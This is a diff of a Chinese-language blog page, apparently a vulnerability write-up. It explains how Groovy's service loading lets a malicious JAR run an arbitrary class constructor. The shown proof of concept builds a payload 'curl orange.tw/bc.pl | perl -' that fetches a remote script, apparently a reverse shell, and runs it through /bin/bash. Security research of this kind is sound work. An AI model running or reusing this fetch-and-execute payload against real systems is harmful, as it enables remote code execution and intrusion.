@@ -352,8 +352,8 @@ import org.restlet
 
 <p>這裡的 <code class="highlighter-rouge">newInstance()</code> 不就代表著可以呼叫到任意類別的 <code class="highlighter-rouge">Constructor</code> 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 <code class="highlighter-rouge">META-INF/services/org.codehaus.groovy.plugins.Runners</code> 中即可呼叫指定類別的<code class="highlighter-rouge">Constructor</code> 去執行任意代碼! 完整的漏洞利用過程如下:</p>
 
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="nf">Poc</span><span class="o">(){</span>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Orange</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">Orange</span><span class="o">(){</span>
         <span class="k">try</span> <span class="o">{</span>
             <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"curl orange.tw/bc.pl | perl -"</span><span class="o">;</span>
             <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/bin/bash"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">payload</span><span class="o">};</span>
